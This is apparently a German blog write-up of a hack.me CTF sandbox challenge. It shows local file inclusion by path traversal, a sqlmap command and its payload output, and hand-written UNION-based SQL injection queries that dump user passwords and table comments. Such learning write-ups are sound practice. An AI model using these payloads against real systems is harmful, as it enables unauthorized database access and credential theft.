---
title: Hack.me - Challenge 0x02
layout: post
permalink: hack-me-challenge-0x02-2
published: true
---
Ich probiere mich in letzter Zeit immer mal wieder an ein paar Challenges auf [hack.me](https://hack.me).

Wer die Seite noch nicht kennt, sollte sie unbedingt ausprobieren. elearnsecurity hat eine Seite ins Leben gerufen, auf der man PHP Code mit Schwachstellen hochladen kann. Jeder Besucher kann sich seine eigene Sandbox starten und darin den Code angreifen.

Aber zurueck zu der eigentlichen Challenge "[Challenge Lab 0x02](https://hack.me/101303/challenge-lab-0x02.html)".

    Hello again.

    We are souvlakiteam!

    In this new challenge you will be able to exercise your skills in an CTF challenge.

    The following challenge is devided in 3 parts. You can move to the next part only if you hack the   previous step.
    The attacks you will need to execute are well-known attacks. Two of them are also on the OWASP 10.

    Are you ready to hack it?

    Go on!

# Spoiler-ALERT!!!!

*Wer die Challenge selber loesen will, sollte hier nicht weiterlesen.*

Man wird mit einer Bierseite begruesst.
![](/content/images/2016/06/2016-06-22-012744_986x662_scrot.png)

## Local File Inclusion
Nachdem man ein wenig auf den ersten Seite rumgeklickt hat sollte erstmals die URLs

* /about.php?a=industrialization
* /about.php?a=ingredients

ins Auge gefallen sein. Auch sollte man den neuen Menupunkt "Fresh News" sehen, der hinzugekommen ist.
![](/content/images/2016/06/2016-06-22-012954_297x266_scrot.png)

Unter diesem Menupunkt bekommt man den ersten Hinweis:

```
TIP [1/4]: usually the SALT is stored in a file called: config.php
```

Wenn man aber versucht eine einfache [LFI](https://www.owasp.org/index.php/Testing_for_Local_File_Inclusion) auszufuehren mit `/about.php?a=config.php` wird man auf die Seite 404.php weitergeleitet. Auch bei `/about.php?a=index.php` ist es die gleiche 404.php.

Also befinden wir uns noch nicht im richtigen Ordner.
Ein kurzer Check mit `/about.php?a=../index.php` bestaetigt das. Aber auch hier kann keine config.php gefunden werden.
Probieren wir das ganze ohne die PHP Endung bekommen wir eine ominoese Fehlermeldung.

![](/content/images/2016/06/2016-06-22-15_06_01-More-about-beer.png)

Es handelt sich hierbei also um einen Ordner. Wenn man nun dort also noch die `config.php` in dem Ordner `../config` aufruft, kann man im Quelltext den Salt finden.

![](/content/images/2016/06/2016-06-22-15_08_12-http___s43216-101303-idu-sipontum-hack-me_about-php_a---_config_config-php.png)

Damit sind wir im nächsten Level bei einer SQL Injection.

## SQL Injection

Hierbei kann man sich verschiedene Biere genauer anschauen. Jedes Bier wird über die URL `/beer.php?id=<ID>` aufgerufen, wobei die ID eine beliebige Zahl sein kann.
Da ich ja schon sagte, dass es sich hierbei um eine SQLi handelt, bleibt uns nur der Parameter `id` übrig. Das es sich hierbei um eine SQLi handelt findet man im Menüpunkt "Kelly Green", der nach Eingabe eines einfachen Anführungszeichens sichtbar wird.

![](/content/images/2016/06/2016-06-22-15_26_46-2---Checkpoint.png)

Nun gibt es hier 2 Methoden dies zu lösen.

### Allzweckwaffe SQLMap
Das ist die Hau-Drauf-Methode. Man startet SQLMap mit folgendem Befehl:

```
$ sqlmap --cookie="PHPSESSID=<value>" "http://<server>.hack.me/beer.php?id=1" -a --dbms=MySQL
```

SQLMap wird an dieser Stelle mehrere Injection Points finden. Hierbei sind unter anderem:

```
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1' AND 6528=6528 AND 'Xrzt'='Xrzt

    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)
    Payload: id=1' AND (SELECT * FROM (SELECT(SLEEP(5)))VEkS) AND 'EYyJ'='EYyJ

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: id=1' UNION ALL SELECT NULL,CONCAT(0x71716b6b71,0x42794f7544496575495347724c6a4676424d6a50434849585867774f474575575669456c77634d6f,0x716a7a6271),NULL-- -
```
Zudem bewirkt der Parameter `-a`, dass er die komplette Datenbank abspeichert.

### Old fashioned handjob
Wer kein SQLMap zur Verfügung hat, kann auch einfach die gute alte Methode verwenden und selber Hand anlegen.
Durch die Eingabe eines einfachen Anführungszeichen bekommen wir folgende Fehlermeldung, welche uns eine vorhande SQLi bestätigt.

```
Warning: mysql_fetch_array() expects parameter 1 to be resource, boolean given in C:\inetpub\wwwroot\coliseum\client\sandbox\43216-101303\BODY\inner\beer.php on line 31
```

Durch weiteres rumprobieren kommt man darauf, dass die Eingabe `' union select 1,2,'3` eine gewollte Ausgabe, ohne Fehlermeldung, liefert.
![](/content/images/2016/06/2016-06-22-15_22_15-Program-Manager.png)
Wir wissen nun 2 Punkte:

* 2 und 3 sind für Ausgaben gut
* Wir brauchen am Ende einen String mit einem einfachen Anführungszeichen am Anfang und keinem Anführungszeichen am Ende.

Wenn man sich ein wenig mit SQL auskennt, kann man sich aus den Bedingungen folgenden SQL Befehl zusammenbauen, um alle Tabellen Namen auszugeben:

```
' UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema != 'mysql' AND table_schema != 'information_schema
```

Das `group_concat` bewirkt hierbei, dass die Namen zusammengefügt und als ein String ausgegeben werden.

![](/content/images/2016/06/2016-06-22-15_25_42-Program-Manager.png)

D.h. die Datenbank hat also 2 Tabellen. Da wir das Passwort von Kelly Green holen wollen, ist die Datenbank `users` interessant.

Wenn wir unseren SQL Exploit ein wenig anpassen, bekommen wir auch alle Columns der Tabelle `users`:

```
' UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'users' AND table_schema != 'mysql' AND table_schema != 'information_schema
```
![](/content/images/2016/06/2016-06-22-15_29_38-Program-Manager.png)

Wir wollen das Passwort von Kelly Green aus der Tabelle `users` haben, was wir mit folgendem SQL Exploit erreichen.

```
' UNION SELECT 1,2,group_concat(concat(name,' - ',surname,' - ',password),'<br />') FROM users WHERE name='Kelly' and surname='Green
```

![](/content/images/2016/06/2016-06-22-15_31_24-Program-Manager.png)

Alternativ können auch einfach alle Benutzer ausgegeben werden, wenn man die Where-Statements weglässt und ein einfaches `where 1='1` aufgrund des Anführungszeichens hinzufügt.

![](/content/images/2016/06/2016-06-22-15_31_56-Our-Beers.png)

Nun haben wir also das Passwort von Kelly Green und können endlich in die letzte Challenge.

## Decipher das Passwort
Wenn man sich das Passwort näher anschaut, fällt einem das `=` am Ende auf, was base64 als Padding verwendet.
Wenn man base64 Decoder auf den String anwendet, kommt tatsächlich ein neuer String raus, der unserem ursprünglichem Salt+Passwort sehr ähnlich sieht: `S09ONTY4dfsa780fsd6b78f6bds6aft876asd658a`
Wir strippen also den Salt von dem String und kommen mit einem Passwort raus `S09ONTY4`.

Nach Eingabe des Passwortes:
![](/content/images/2016/06/2016-06-22-15_35_44-3---Final-STEP.png)

Awwww....

Wir haben aber auch den Tip noch nicht beachtet:

```
TIP [1/4]: TIP: you have the dump of database, but we know that in the table users someone writes the algorithm to store the password...	
```

Hierzu muss man wissen, dass man in MySQL Kommentare zu Tabellen speichern kann. Diese kann man einfach über die Information_Schema Datenbank abfragen.

```
' UNION SELECT 1,2,group_concat(table_comment,'<br />') FROM information_schema.tables WHERE table_name='users
```

Dies liefert uns den Algorithmus: `password = base64(base64(password) + salt)`

Wir müssen also `S09ONTY4` nochmal mit base64 Decoden und landen bei `KON568`.

Nach Eingabe dieses Strings, endlich:
![](/content/images/2016/06/2016-06-22-15_39_47-3---Final-STEP.png)

*(Wer mit SQLMap einfach die gesamte Datenbank geholt hat, hätte auch einfach nach `base64` grepen können und der Algorithmus wäre klar gewesen)* 

so long.